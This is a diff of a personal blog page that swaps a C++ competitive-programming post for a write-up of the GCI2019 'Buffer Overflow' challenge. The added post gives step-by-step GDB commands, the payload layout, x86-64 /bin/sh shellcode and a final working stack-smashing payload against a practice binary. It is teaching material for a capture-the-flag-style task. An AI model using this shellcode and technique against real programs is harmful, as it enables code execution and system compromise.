@@ -4,14 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Code Test, YYBlog">
-    <meta name="description" content="#include &amp;lt;bits/stdc++.h&gt;
-using namespace std;
-
-const int M=int(1e9)+7;
-
-int a[100005];
-vector&amp;lt;pair&amp;lt;int, int&gt;&gt; v">
+    <meta name="keywords" content="[GCI2019] Buffer Overflow, YYBlog">
+    <meta name="description" content="This is the write-up for the task Buffer Overflow in GCI2019!
+Asciinema Link
+First, make the stack executeable so we can">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +15,7 @@ vector&amp;lt;pair&amp;lt;int, int&gt;&gt; v">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Code Test | YYBlog</title>
+    <title>[GCI2019] Buffer Overflow | YYBlog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -203,13 +199,13 @@ vector&amp;lt;pair&amp;lt;int, int&gt;&gt; v">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/material-11.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/material-15.png')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Code Test
+                        [GCI2019] Buffer Overflow
                     </div>
                 </div>
             </div>
@@ -320,8 +316,8 @@ vector&amp;lt;pair&amp;lt;int, int&gt;&gt; v">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Cpp/" target="_blank">
-                                <span class="chip bg-color">Cpp</span>
+                            <a href="/tags/Buffer-Overflow/" target="_blank">
+                                <span class="chip bg-color">Buffer Overflow</span>
                             </a>
                         
                     </div>
@@ -332,8 +328,8 @@ vector&amp;lt;pair&amp;lt;int, int&gt;&gt; v">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Programming/" class="post-category" target="_blank">
-                                Programming
+                            <a href="/categories/Cyber-Security/" class="post-category" target="_blank">
+                                Cyber Security
                             </a>
                         
                     </div>
@@ -344,7 +340,7 @@ vector&amp;lt;pair&amp;lt;int, int&gt;&gt; v">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2019-06-16
+                    2020-01-08
                 </div>
 
                 
@@ -355,52 +351,112 @@ vector&amp;lt;pair&amp;lt;int, int&gt;&gt; v">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span>
-<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
+                <p>This is the write-up for the task <a href="https://codein.withgoogle.com/tasks/6516326449807360" target="_blank" rel="noopener">Buffer Overflow</a> in GCI2019!</p>
+<p><a href="https://asciinema.org/a/292237" target="_blank" rel="noopener">Asciinema Link</a></p>
+<p>First, make the stack executeable so we can run our shellcode in the buffer.</p>
+<pre class=" language-bash"><code class="language-bash">$ execstack -s exploitme</code></pre>
+<p>And then, run GDB</p>
+<pre class=" language-bash"><code class="language-bash">$ gdb exploitme</code></pre>
+<p>This program takes its argument and prints it out</p>
+<pre><code>(gdb) run 123                             
+Starting program: /home/yi/Workspace/GCI/BufferOverflow/exploitme 123
+123                                     
+[Inferior 1 (process 116393) exited normally] </code></pre><p>If we disassemble the <code>main</code> funcion, we can see that it uses the <code>strcpy</code> function, which is vulnerable to buffer overflow attacks</p>
+<pre><code>(gdb) disas main
+Dump of assembler code for function main:
+   0x0000555555555145 &lt;+0&gt;:    push   %rbp
+   0x0000555555555146 &lt;+1&gt;:    mov    %rsp,%rbp
+   0x0000555555555149 &lt;+4&gt;:    sub    $0x110,%rsp
+   0x0000555555555150 &lt;+11&gt;:    mov    %edi,-0x104(%rbp)
+   0x0000555555555156 &lt;+17&gt;:    mov    %rsi,-0x110(%rbp)
+   0x000055555555515d &lt;+24&gt;:    mov    -0x110(%rbp),%rax
+   0x0000555555555164 &lt;+31&gt;:    add    $0x8,%rax
+   0x0000555555555168 &lt;+35&gt;:    mov    (%rax),%rdx
+   0x000055555555516b &lt;+38&gt;:    lea    -0x100(%rbp),%rax
+   0x0000555555555172 &lt;+45&gt;:    mov    %rdx,%rsi
+   0x0000555555555175 &lt;+48&gt;:    mov    %rax,%rdi
+   0x0000555555555178 &lt;+51&gt;:    callq  0x555555555030 &lt;strcpy@plt&gt;
+   0x000055555555517d &lt;+56&gt;:    lea    -0x100(%rbp),%rax
+   0x0000555555555184 &lt;+63&gt;:    mov    %rax,%rdi
+   0x0000555555555187 &lt;+66&gt;:    callq  0x555555555040 &lt;puts@plt&gt;
+   0x000055555555518c &lt;+71&gt;:    mov    $0x0,%eax
+   0x0000555555555191 &lt;+76&gt;:    leaveq 
+   0x0000555555555192 &lt;+77&gt;:    retq   
+End of assembler dump.</code></pre><p>When the system calls the <code>main</code> function, the return pointer was pushed into the stack, the char buffer is pushed afterwards and then the input is copied</p>
+<p>Therefore, if the input is too long, it may overwrite the return address</p>
+<pre><code>(gdb) run $(python2 -c &quot;print(&#39;A&#39;*300)&quot;)
+Starting program: /home/yi/Workspace/GCI/BufferOverflow/exploitme $(python2 -c &quot;print(&#39;A&#39;*300)&quot;)
 
-<span class="token keyword">const</span> <span class="token keyword">int</span> M<span class="token operator">=</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">1e9</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">;</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAA
 
-<span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span> v<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token comment" spellcheck="true">/// index, cnt suffix sum</span>
-<span class="token keyword">int</span> b<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">int</span> vi<span class="token punctuation">[</span><span class="token number">100005</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> ans<span class="token punctuation">;</span>
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555555192 in main ()
 
-<span class="token keyword">bool</span> <span class="token function">cmp</span> <span class="token punctuation">(</span><span class="token keyword">const</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">&amp;</span>pa<span class="token punctuation">,</span> <span class="token keyword">const</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">&amp;</span>pb<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">return</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>pa<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token operator">==</span>a<span class="token punctuation">[</span>pb<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> pa<span class="token punctuation">.</span>second<span class="token operator">&lt;</span>pb<span class="token punctuation">.</span>second<span class="token punctuation">)</span> <span class="token operator">||</span> a<span class="token punctuation">[</span>pa<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token operator">&lt;</span>a<span class="token punctuation">[</span>pb<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+(gdb) x/i $rip
+=&gt; 0x555555555192 &lt;main+77&gt;:    retq
 
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">int</span> n<span class="token punctuation">;</span>
-    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">int</span> ed<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
-    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">int</span><span class="token operator">*</span> ub<span class="token operator">=</span><span class="token function">upper_bound</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> b<span class="token operator">+</span>ed<span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">int</span> ind<span class="token operator">=</span>ub<span class="token operator">-</span>b<span class="token punctuation">;</span>
-        ed<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>ed<span class="token punctuation">,</span> ind<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">auto</span> it<span class="token operator">=</span><span class="token function">upper_bound</span><span class="token punctuation">(</span>v<span class="token punctuation">[</span>ind<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v<span class="token punctuation">[</span>ind<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">rend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">make_pair</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">1e9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">int</span> cnt<span class="token operator">=</span>v<span class="token punctuation">[</span>ind<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>second<span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>it<span class="token operator">!=</span>v<span class="token punctuation">[</span>ind<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">rend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> cnt<span class="token operator">=</span><span class="token punctuation">(</span>cnt<span class="token operator">+</span>M<span class="token operator">-</span>it<span class="token operator">-</span><span class="token operator">></span>second<span class="token punctuation">)</span><span class="token operator">%</span>M<span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>v<span class="token punctuation">[</span>ind<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> cnt<span class="token operator">=</span><span class="token punctuation">(</span>v<span class="token punctuation">[</span>ind<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>second<span class="token operator">+</span>cnt<span class="token punctuation">)</span><span class="token operator">%</span>M<span class="token punctuation">;</span>
-        v<span class="token punctuation">[</span>ind<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> cnt<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        b<span class="token punctuation">[</span>ind<span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
-        vi<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>v<span class="token punctuation">[</span>ind<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>it<span class="token number">-1</span><span class="token operator">-</span>v<span class="token punctuation">[</span>ind<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    cout <span class="token operator">&lt;&lt;</span> ed<span class="token number">-1</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span> <span class="token operator">&lt;&lt;</span> v<span class="token punctuation">[</span>ed<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>second <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
-    <span class="token keyword">int</span> ind<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>ed<span class="token number">-1</span><span class="token punctuation">;</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        ans<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>ind<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        ind<span class="token operator">=</span>vi<span class="token punctuation">[</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>ind<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i<span class="token operator">=</span>ans<span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>ans<span class="token punctuation">.</span><span class="token function">rend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">!=</span>ans<span class="token punctuation">.</span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> cout <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
-        cout <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>i<span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
+(gdb) x/g $rsp
+0x7fffffffd908:    0x4141414141414141</code></pre><p>The return address was overwritten to ‘A’s (<code>0x41</code>) 
+When the <code>main</code> function finishes and is going to return, the system can not access the address <code>0x4141414141414141</code> so it causes segfault</p>
+<p>However, if we can overwrite the address intentionally and point it to the buffer, we can trick the program into running our assembly code</p>
+<p>Let’s test different lengths to find out where the address is</p>
+<pre><code>&#39;A&#39;*300 -&gt; segfault
+&#39;A&#39;*200 -&gt; exited normally
+&#39;A&#39;*250 -&gt; exited normally
+&#39;A&#39;*260 -&gt; exited normally
+&#39;A&#39;*270 -&gt; jumped to 0x0000414141414141 and segfault
+&#39;A&#39;*265 -&gt; jumped to 0x00007ffff7de0041 and segfault
+&#39;A&#39;*266 -&gt; jumped to 0x00007ffff7de4141 and segfault
+&#39;A&#39;*264+&#39;BBBBBB&#39; -&gt; jumped to 0x0000424242424242 and segfault</code></pre><p>Now we know that the return address is 264 bytes away from the start of the buffer</p>
+<p>We can now insert this shellcode that executes /bin/sh to get the shell</p>
+<p><code>\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</code><br><a href="https://www.exploit-db.com/exploits/42179" target="_blank" rel="noopener">Source</a></p>
+<p>Payload:<br><code>[nopslide(100B)]</code>+<code>[shellcode(23B)]</code>+<code>[random thing(264-100-23B)]</code>+<code>[address to nopslide]</code></p>
+<blockquote>
+<p>If the shellcode is too close to <code>$rsp</code>, it may corrupt itself.<br>So I put the shellcode a little bit away from <code>$rsp</code></p>
+</blockquote>
+<p>We don’t have the exact address to the nopslide, but we can just place it with ‘B’s and look it up later</p>
+<pre><code>(gdb) run $(python2 -c &quot;print(&#39;\x90&#39;*100 + &#39;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&#39; + &#39;A&#39;*(264-100-24) + &#39;BBBBBB&#39;)&quot;)
+Program received signal SIGSEGV, Segmentation fault.
+0x0000424242424242 in ?? ()</code></pre><blockquote>
+<p>Use python2 instead of python3<br>Python3’s print function has some kind of encodings, and some characters will change<br>e.g <code>0x90</code> becomes <code>0xc290</code></p>
+</blockquote>
+<p>The program jumped to <code>0x0000424242424242</code>, which means our payload is correct</p>
+<p>Now we are going to look up the address of our buffer<br>We know that the buffer string has been popped, so we have to look behind <code>$rsp</code></p>
+<pre><code>(gdb) x/200bx $rsp-300
+
+0x7fffffffdab4: 0x00 0x00 0x00 0x00 0x8c 0x51 0x55 0x55
+0x7fffffffdabc: 0x55 0x55 0x00 0x00 0xb8 0xdc 0xff 0xff
+0x7fffffffdac4: 0xff 0x7f 0x00 0x00 0xc0 0xe6 0xff 0xf7
+0x7fffffffdacc: 0x02 0x00 0x00 0x00 0x90 0x90 0x90 0x90
+0x7fffffffdad4: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0x7fffffffdadc: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0x7fffffffdae4: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0x7fffffffdaec: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0x7fffffffdaf4: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0x7fffffffdafc: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0x7fffffffdb04: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0x7fffffffdb0c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0x7fffffffdb14: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0x7fffffffdb1c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0x7fffffffdb24: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0x7fffffffdb2c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
+0x7fffffffdb34: 0x50 0x48 0x31 0xd2 0x48 0x31 0xf6 0x48
+0x7fffffffdb3c: 0xbb 0x2f 0x62 0x69 0x6e 0x2f 0x2f 0x73
+0x7fffffffdb44: 0x68 0x53 0x54 0x5f 0xb0 0x3b 0x0f 0x05
+0x7fffffffdb4c: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
+0x7fffffffdb54: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
+0x7fffffffdb5c: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
+0x7fffffffdb64: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41</code></pre><p>Found the nopslide, the shellcode and the ‘A’s!</p>
+<p>Choose one of the addresses in the nopslide: <code>0x7fffffffdb2c</code></p>
+<p>Final payload:<br><code>&#39;\x90&#39;*100 + &#39;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&#39; + &#39;A&#39;*(264-100-24) + &#39;\x2c\xdb\xff\xff\xff\x7f&#39;</code></p>
+<pre><code>(gdb) run $(python2 -c &quot;print(&#39;\x90&#39;*100 + &#39;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&#39; + &#39;A&#39;*(264-100-24) + &#39;\x2c\xdb\xff\xff\xff\x7f&#39;)&quot;)
+Starting program: /home/yi/Workspace/GCI/BufferOverflow/exploitme $(python2 -c &quot;print(&#39;\x90&#39;*100 + &#39;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&#39; + &#39;A&#39;*(264-100-24) + &#39;\x2c\xdb\xff\xff\xff\x7f&#39;)&quot;)
+����������������������������������������������������������������������������������������������������PH1�H1�H�/bin//shST_�;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,����
+process 116461 is executing new program: /usr/bin/bash
+[yi@YNB BufferOverflow]$</code></pre><p>We got the shell!</p>
 
             </div>
             <hr>
@@ -432,9 +488,9 @@ vector<span class="token operator">&lt;</span><span class="token keyword">int</s
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《Code Test》
+                    《[GCI2019] Buffer Overflow》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/06/16/Code-Test/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/01/08/GCI2019-BufferOverflow/" property="cc:attributionName" rel="cc:attributionURL">
                 Yi Kuo
             </a> is licensed under a
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
@@ -475,7 +531,8 @@ vector<span class="token operator">&lt;</span><span class="token keyword">int</s
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2020/01/08/GCI2019-BufferOverflow/">
                     <div class="card-image">
@@ -495,9 +552,9 @@ First, make the stack executeable so we can
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-01-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-01-08
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -510,6 +567,7 @@ First, make the stack executeable so we can
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -525,7 +583,7 @@ First, make the stack executeable so we can
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                Current&nbsp;<i class="fa fa-dot-circle-o"></i>
+                Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/2019/06/16/Code-Test/">
@@ -565,7 +623,6 @@ vector&lt;pair&lt;int, int>> v
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
